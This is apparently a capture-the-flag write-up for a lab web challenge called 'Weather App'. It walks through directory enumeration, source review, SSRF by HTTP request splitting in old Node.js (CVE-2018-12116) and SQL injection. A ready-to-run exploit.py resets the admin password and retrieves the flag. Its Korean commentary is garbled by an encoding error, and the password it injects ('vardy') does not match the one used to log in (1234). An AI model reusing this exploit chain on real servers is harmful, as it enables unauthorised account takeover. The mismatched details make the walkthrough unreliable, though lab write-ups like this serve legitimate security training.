ROOM: Weather App
TARGET: 94.237.57.211:37932

http://94.237.57.211:37932/
Sejong ë‚ ì”¨ ì•Œë ¤ì£¼ëŠ” webpage





gobuster dir -u http://94.237.57.211:37932/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
/login                (Status: 200) [Size: 1657]
/Login                (Status: 200) [Size: 1657]
/register             (Status: 200) [Size: 1663]
/static               (Status: 301) [Size: 179] [--> /static/]

/Login                (Status: 200) [Size: 1657]
ë¡œê·¸ì¸í˜ì´ì§€
/register             (Status: 200) [Size: 1663]
íšŒì›ê°€ì… í˜ì´ì§€
íšŒì›ê°€ì… ë¡œê·¸ì¸ ë‘˜ë‹¤ ì•ˆë¨
sql injection ì‹œë„ 
' or 1=1 --
1234
'or 1=1 #
1234

í•´ë´¤ìœ¼ë‚˜ ì‹¤íŒ¨

ì„œë¹„ìŠ¤ ì½”ë“œë¥¼ ë¶„ì„ ì‹œë„



/routes/index.js ì½”ë“œ

router.post('/register', (req, res) => {

	if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
		return res.status(401).end();
	}

	let { username, password } = req.body;

	if (username && password) {
		return db.register(username, password)
			.then(()  => res.send(response('Successfully registered')))
			.catch(() => res.send(response('Something went wrong')));
	}

	return res.send(response('Missing parameters'));
});


register í˜ì´ì§€ì—ì„œ postë³´ë‚´ëŠ” ìš”ì²­ > íšŒì›ê°€ì… ì²˜ë¦¬ë¥¼ ë³´ë‹ˆ 
ë¡œì»¬ì—ì„œ ìš”ì²­í•˜ëŠ”ê²Œ ì•„ë‹ˆë©´ ë¶ˆê°€ëŠ¥ í•˜ê²Œ í•´ë‘  >> ssrf




router.post('/login', (req, res) => {
	let { username, password } = req.body;

	if (username && password) {
		return db.isAdmin(username, password)
			.then(admin => {
				if (admin) return res.send(fs.readFileSync('/app/flag').toString());
				return res.send(response('You are not admin'));
			})
			.catch(() => res.send(response('Something went wrong')));
	}
	
	return re.send(response('Missing parameters'));
});
ë§Œì•½ ìœ ì €ê°€ ì–´ë“œë¯¼ìœ¼ë¡œ ë¡œê·¸ì¸í•˜ê²Œë˜ë©´ í”Œë˜ê·¸ ì¶œë ¥

/package.json ì½”ë“œ

"nodeVersion": "v8.12.0",
nodejs ë²„ì „ì´ êµ¬ë²„ì „ì´ë‹¤ 


/helpers/WeatherHelper.js
async getWeather(res, endpoint, city, country) {

        // *.openweathermap.org is out of scope
        let apiKey = '10a62430af617a949055a46fa6dec32f';
        let weatherData = await HttpHelper.HttpGet(`http://${endpoint}/data/2.5/weather?q=${city},${country}&units=metric&appid=${apiKey}`); 
      
ë‚´ë¶€ ì½”ë“œë¥¼ ë³´ë©´ ì‹¤ì œë¡œ apikeyë¥¼ í†µí•´ì„œ ì™¸ë¶€ì‚¬ì´íŠ¸ì— ìš”ì²­ì„ ë³´ë‚´ëŠ”ì¤‘
ì € ì£¼ì†Œë¥¼ ë‚´ê°€ ì›í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ ìˆ˜ì •í•´ì„œ ë‚´ê°€ ì‚¬ì´íŠ¸ì— ìš”ì²­ì„ ë³´ë‚´ë©´ ë ê±°ê°™ë‹¤


êµ¬ê¸€ì— nodejs ssrf ì·¨ì•½ì  ê²€ìƒ‰

Node.js v8 ë²„ì „ì—ì„œ SSRF ì·¨ì•½ì ì´ ì¡´ì¬í•˜ë©°, íŠ¹íˆ HTTP request splittingì„ ì´ìš©í•œ ê³µê²©ì´ ê°€ëŠ¥í–ˆìŠµë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ íŠ¹ì • ë²„ì „(v6.x, v8.x)ì—ì„œ ë°œê²¬ë˜ì—ˆê³ , ì´í›„ ì—…ë°ì´íŠ¸ë¥¼ í†µí•´ ìˆ˜ì •ë˜ì—ˆìŠµë‹ˆë‹¤. 
SSRF (Server-Side Request Forgery) ë€?
SSRFëŠ” ì„œë²„ ì¸¡ì—ì„œ ê³µê²©ìê°€ ì˜ë„í•œ ë‹¤ë¥¸ ì„œë²„ë¡œ ìš”ì²­ì„ ë³´ë‚´ë„ë¡ ì¡°ì‘í•˜ëŠ” ê³µê²© ê¸°ë²•ì…ë‹ˆë‹¤. ê³µê²©ìëŠ” ì„œë²„ì˜ ê¶Œí•œì„ ì´ìš©í•˜ì—¬ ë‚´ë¶€ ì‹œìŠ¤í…œì´ë‚˜ ë¯¼ê°í•œ ë°ì´í„°ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. 
Node.js v8ì—ì„œì˜ SSRF ì·¨ì•½ì :
Node.js v8 ë²„ì „ì—ì„œëŠ” HTTP request splitting ê¸°ë²•ì„ ì´ìš©í•œ SSRF ê³µê²©ì´ ê°€ëŠ¥í–ˆìŠµë‹ˆë‹¤. ì´ëŠ” Node.jsê°€ HTTP ìš”ì²­ í—¤ë”ë¥¼ ì²˜ë¦¬í•˜ëŠ” ê³¼ì •ì—ì„œ íŠ¹ì • í˜•ì‹ì˜ ìœ íš¨í•˜ì§€ ì•Šì€ ìœ ë‹ˆì½”ë“œ ë°ì´í„°ë¥¼ í¬í•¨í•œ ìš”ì²­ì„ ì²˜ë¦¬í•  ë•Œ ë°œìƒí–ˆìŠµë‹ˆë‹¤

CVE-2018-12116
https://jaeseokim.dev/Security/nodejs-HTTP-request-splitting%EC%9D%84-%EC%9D%B4%EC%9A%A9%ED%95%9C-SSRF-%EC%B7%A8%EC%95%BD%EC%A0%90featNullCon2020-splitsecond-WriteUp/


CVE-2018-12116
ëŒ€ìƒ : Node.js: All versions prior to Node.js 6.15.0 and 8.14.0

ìœ„í˜‘ : HTTP request splitting

Node.Jsê°€ ì •ìƒì ì´ì§€ ì•Šì€ ìœ ë‹ˆì½”ë“œ ë°ì´í„°ë¥¼ path ì˜µì…˜ìœ¼ë¡œ HTTP requestì„ ë°›ì•„ë“¤ì´ë©´ ê·¸ ë°ì´í„°ëŠ” ë‹¤ë¥¸ ë°ì´í„°ë¡œ ë³€í™˜ë˜ì–´ ì‘ë™í•˜ê²Œ ë©ë‹ˆë‹¤. ì´ì ì„ ì´ìš©í•˜ì—¬ HTTP request splitì´ ì‹¤í–‰ ë©ë‹ˆë‹¤.

ex)

\u{01F436} = ğŸ¶ | server -> \x36 = 6

\u{010D} = Ä | server -> \x0d = \r

\u{010A} = ÄŠ | server -> \x0a = \n

payloadêµ¬ìƒ

GET /data/2.5/weather?q=vardy HTTP/1.1
HOST: 127.0.0.1

POST /register HTTP/1.1
HOST: 127.0.0.1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 126

username=admin&password=asd') ON CONFLICT (username) DO UPDATE SET password='vardy'-- 
#admin íŒ¨ìŠ¤ì›Œë“œ 1234ë³€ê²½

GET /


//

exploit.pyì‘ì„±

import requests

url = 'http://94.237.57.211:37932/api/weather'


#let query = `INSERT INTO users (username, password) VALUES ('${user}', '${pass}')`;
#INSERT INTO users (username, password) VALUES ('admin', 'vardy') ON CONFLICT (username) DO UPDATE SET password = 'vardy';--')


sqli = "username=admin&password=asd%27%29+ON+CONFLICT+%28username%29+DO+UPDATE+SET+password=%27vardy%27--"
#sqli = sqli.replace(' ','%20')
cl = str(len(sqli))

exploit = ''' HTTP/1.1
HOST: 127.0.0.1


POST /register HTTP/1.1
HOST: 127.0.0.1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: {}

{}

GET /'''.format(cl,sqli)

print(exploit)

exploit = exploit.replace(' ', '\u0120')
exploit = exploit.replace('\n','\u010D\u010A')

print(exploit)

data = {'endpoint': '127.0.0.1', 'city': 'vardy', 'country':exploit}

response = requests.post(url, data=data)

print(response.status_code)
print(response.text)

python exploit.py

ë¡œê·¸ì¸í˜ì´ì§€ ì ‘ì† 
admin
1234
ë¡œê·¸ì¸

flag ì¶œë ¥
HTB{w3lc0m3_t0_th3_p1p3_dr34m}

ì°¸ê³ 
https://vardy.tistory.com/267
https://jaeseokim.dev/Security/nodejs-HTTP-request-splitting%EC%9D%84-%EC%9D%B4%EC%9A%A9%ED%95%9C-SSRF-%EC%B7%A8%EC%95%BD%EC%A0%90featNullCon2020-splitsecond-WriteUp/

